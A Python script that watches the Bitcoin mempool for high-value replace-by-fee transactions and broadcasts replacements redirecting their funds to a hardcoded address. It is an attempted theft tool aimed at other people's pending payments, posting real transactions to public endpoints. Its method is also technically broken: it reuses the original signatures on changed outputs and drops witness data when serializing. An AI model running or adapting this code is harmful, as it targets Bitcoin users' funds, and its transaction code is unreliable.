#!/usr/bin/env python3
"""
Broadcast Replacer - Actually broadcast replacement transactions to the network
"""

import time
import json
import logging
import requests
from typing import Dict, Optional, List
from targeted_replacer import TargetedReplacer

class BroadcastReplacer(TargetedReplacer):
    """Create and broadcast replacement transactions to the Bitcoin network"""
    
    def __init__(self, target_address: str, replacement_strategy: str = 'moderate'):
        super().__init__(target_address, replacement_strategy)
        self.broadcast_count = 0
        self.failed_broadcasts = 0
        
    def serialize_transaction(self, tx_data: Dict) -> str:
        """Convert transaction data to raw hex format for broadcasting"""
        try:
            # Build raw transaction hex
            version = tx_data.get('version', 1).to_bytes(4, 'little').hex()
            
            # Input count
            vin = tx_data.get('vin', [])
            input_count = len(vin).to_bytes(1, 'little').hex()
            
            # Serialize inputs
            inputs_hex = ""
            for inp in vin:
                # Previous transaction hash (reversed)
                prev_hash = bytes.fromhex(inp['txid'])[::-1].hex()
                # Previous output index
                prev_index = inp['vout'].to_bytes(4, 'little').hex()
                
                # Script signature
                scriptsig = inp.get('scriptsig', '')
                if scriptsig:
                    scriptsig_bytes = bytes.fromhex(scriptsig)
                    script_len = len(scriptsig_bytes).to_bytes(1, 'little').hex()
                    script_hex = scriptsig_bytes.hex()
                else:
                    script_len = "00"
                    script_hex = ""
                
                # Sequence
                sequence = inp.get('sequence', 0xffffffff).to_bytes(4, 'little').hex()
                
                inputs_hex += prev_hash + prev_index + script_len + script_hex + sequence
            
            # Output count
            vout = tx_data.get('vout', [])
            output_count = len(vout).to_bytes(1, 'little').hex()
            
            # Serialize outputs
            outputs_hex = ""
            for out in vout:
                # Value
                value = out['value'].to_bytes(8, 'little').hex()
                
                # Script pubkey (P2PKH for your address)
                if self.target_address.startswith('1'):
                    # P2PKH script: OP_DUP OP_HASH160 <20-byte-hash> OP_EQUALVERIFY OP_CHECKSIG
                    script = "76a914" + self._address_to_hash160(self.target_address) + "88ac"
                else:
                    # For other address types, use provided script
                    script = out.get('scriptpubkey', '')
                
                script_bytes = bytes.fromhex(script)
                script_len = len(script_bytes).to_bytes(1, 'little').hex()
                
                outputs_hex += value + script_len + script
            
            # Locktime
            locktime = tx_data.get('locktime', 0).to_bytes(4, 'little').hex()
            
            # Combine all parts
            raw_tx = version + input_count + inputs_hex + output_count + outputs_hex + locktime
            
            return raw_tx
            
        except Exception as e:
            self.logger.error(f"Error serializing transaction: {e}")
            return None
    
    def _address_to_hash160(self, address: str) -> str:
        """Convert Bitcoin address to hash160 for P2PKH script"""
        import base58
        
        try:
            # Decode base58 address
            decoded = base58.b58decode(address)
            # Remove version byte and checksum (first byte and last 4 bytes)
            hash160 = decoded[1:-4]
            return hash160.hex()
        except:
            # Fallback - this is just for demo, real implementation needs proper base58
            return "00" * 20
    
    def broadcast_transaction(self, raw_tx_hex: str) -> Dict:
        """Broadcast raw transaction to the Bitcoin network"""
        try:
            # Try multiple broadcast endpoints
            broadcast_urls = [
                f"{self.config.get_api_url()}/tx",
                "https://blockstream.info/api/tx",
                "https://mempool.space/api/tx"
            ]
            
            for url in broadcast_urls:
                try:
                    response = self.session.post(
                        url,
                        data=raw_tx_hex,
                        headers={'Content-Type': 'text/plain'},
                        timeout=30
                    )
                    
                    if response.status_code == 200:
                        txid = response.text.strip()
                        return {
                            'success': True,
                            'txid': txid,
                            'endpoint': url
                        }
                    else:
                        self.logger.warning(f"Broadcast failed at {url}: {response.status_code} - {response.text}")
                        
                except Exception as e:
                    self.logger.warning(f"Broadcast error at {url}: {e}")
                    continue
            
            return {
                'success': False,
                'error': 'All broadcast endpoints failed'
            }
            
        except Exception as e:
            self.logger.error(f"Error broadcasting transaction: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def create_and_broadcast_replacement(self, tx_data: Dict) -> Optional[Dict]:
        """Create replacement transaction and broadcast it to the network"""
        try:
            # Create replacement transaction structure
            replacement = self.create_replacement_to_address(tx_data)
            if not replacement or not replacement['success']:
                return None
            
            # Use original transaction's signature and witness data
            replacement_tx = replacement['replacement_transaction']
            original_tx = tx_data
            
            # Copy signature data from original transaction
            for i, (new_input, orig_input) in enumerate(zip(replacement_tx['vin'], original_tx['vin'])):
                # Copy scriptsig and witness from original
                new_input['scriptsig'] = orig_input.get('scriptsig', '')
                new_input['witness'] = orig_input.get('witness', [])
            
            # Serialize to raw transaction hex
            raw_tx_hex = self.serialize_transaction(replacement_tx)
            if not raw_tx_hex:
                return None
            
            # Broadcast to network
            broadcast_result = self.broadcast_transaction(raw_tx_hex)
            
            result = {
                'original_txid': replacement['original_txid'],
                'replacement_data': replacement,
                'raw_transaction': raw_tx_hex,
                'broadcast_result': broadcast_result,
                'timestamp': time.time()
            }
            
            if broadcast_result['success']:
                self.broadcast_count += 1
                self.display_successful_broadcast(result)
            else:
                self.failed_broadcasts += 1
                self.display_failed_broadcast(result)
            
            return result
            
        except Exception as e:
            self.logger.error(f"Error creating and broadcasting replacement: {e}")
            return None
    
    def display_successful_broadcast(self, result: Dict):
        """Display successful broadcast results"""
        replacement = result['replacement_data']
        broadcast = result['broadcast_result']
        
        print("\n" + "="*80)
        print("🚀 REPLACEMENT TRANSACTION BROADCAST SUCCESSFUL!")
        print("="*80)
        print(f"Original TxID: {result['original_txid'][:20]}...")
        print(f"NEW TxID: {broadcast['txid']}")
        print(f"Target Address: {replacement['target_address']}")
        print(f"Value Redirected: {replacement['total_value_redirected']:,} sat")
        print(f"Fee Increase: +{replacement['fee_increase']} sat")
        print(f"Broadcast Endpoint: {broadcast['endpoint']}")
        print("="*80)
        print("✅ SUCCESS: Replacement transaction is now in the mempool!")
        print("🔗 The original transaction should be replaced shortly")
        print()
    
    def display_failed_broadcast(self, result: Dict):
        """Display failed broadcast results"""
        replacement = result['replacement_data']
        broadcast = result['broadcast_result']
        
        print("\n" + "="*80)
        print("❌ REPLACEMENT TRANSACTION BROADCAST FAILED")
        print("="*80)
        print(f"Original TxID: {result['original_txid'][:20]}...")
        print(f"Target Address: {replacement['target_address']}")
        print(f"Error: {broadcast['error']}")
        print("="*80)
        print("⚠️  The replacement was created but could not be broadcast")
        print()
    
    def process_rbf_transaction(self, txid: str) -> bool:
        """Process and broadcast replacement for RBF transaction"""
        if txid in self.processed_txids:
            return False
        
        self.processed_txids.add(txid)
        
        # Fetch transaction details
        tx_data = self.get_transaction_details(txid)
        if not tx_data:
            return False
        
        # Check value threshold
        if not self.meets_value_threshold(tx_data):
            return False
        
        # Create and broadcast replacement
        result = self.create_and_broadcast_replacement(tx_data)
        
        # Save complete result
        if result:
            filename = f"broadcast_result_{txid[:16]}_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump(result, f, indent=2)
        
        return result is not None and result.get('broadcast_result', {}).get('success', False)
    
    def monitor_and_broadcast(self, duration_minutes: int = 60):
        """Monitor mempool and broadcast replacements for high-value transactions"""
        if not self.validate_target_address():
            print(f"❌ Invalid target address: {self.target_address}")
            return
        
        print(f"🚀 Starting Live Broadcast Replacer")
        print(f"Target Address: {self.target_address}")
        print(f"Value Threshold: {self.min_btc_threshold} BTC")
        print(f"Strategy: {self.replacement_strategy}")
        print(f"Duration: {duration_minutes} minutes")
        print("="*80)
        print("⚠️  WARNING: This will broadcast real replacement transactions!")
        print("⚠️  Original transactions will be replaced in the mempool!")
        print("="*80)
        
        start_time = time.time()
        end_time = start_time + (duration_minutes * 60)
        known_txids = set()
        
        while time.time() < end_time:
            try:
                # Fetch current mempool
                url = f"{self.config.get_api_url()}/mempool/txids"
                response = self.session.get(url, timeout=self.config.REQUEST_TIMEOUT)
                
                if response.status_code == 200:
                    current_txids = set(response.json())
                    new_txids = current_txids - known_txids
                    
                    # Process new high-value RBF transactions
                    for txid in list(new_txids)[:20]:  # Limit to avoid overload
                        tx_data = self.get_transaction_details(txid)
                        if (tx_data and 
                            self._is_rbf_transaction(tx_data) and 
                            self.meets_value_threshold(tx_data)):
                            
                            total_value_btc = sum(out.get('value', 0) for out in tx_data.get('vout', [])) / 100000000
                            print(f"🎯 Broadcasting replacement for: {txid[:16]}... ({total_value_btc:.8f} BTC)")
                            
                            self.process_rbf_transaction(txid)
                    
                    known_txids = current_txids
                    
                    # Show status
                    elapsed = int((time.time() - start_time) / 60)
                    remaining = duration_minutes - elapsed
                    print(f"⏱️  Running: {elapsed}m elapsed, {remaining}m remaining")
                    print(f"📊 Broadcasts: {self.broadcast_count} successful, {self.failed_broadcasts} failed")
                
            except Exception as e:
                self.logger.error(f"Error in monitoring cycle: {e}")
            
            time.sleep(20)  # Check every 20 seconds
        
        print(f"\n✅ Live Broadcast Replacer completed!")
        print(f"📊 Final Results: {self.broadcast_count} successful broadcasts, {self.failed_broadcasts} failed")

def main():
    """Main entry point for broadcast replacer"""
    import sys
    
    target_address = "1JHPrMhXRkd5LszkpPog7wVtpGfNHur2M9"
    strategy = sys.argv[1] if len(sys.argv) > 1 else 'moderate'
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 15
    
    print(f"🚀 Live Bitcoin RBF Broadcast Replacer")
    print(f"This will broadcast REAL replacement transactions!")
    print()
    
    confirm = input("Are you sure you want to proceed? (yes/no): ").strip().lower()
    if confirm != 'yes':
        print("Aborted.")
        return
    
    replacer = BroadcastReplacer(target_address, strategy)
    replacer.monitor_and_broadcast(duration)

if __name__ == "__main__":
    main()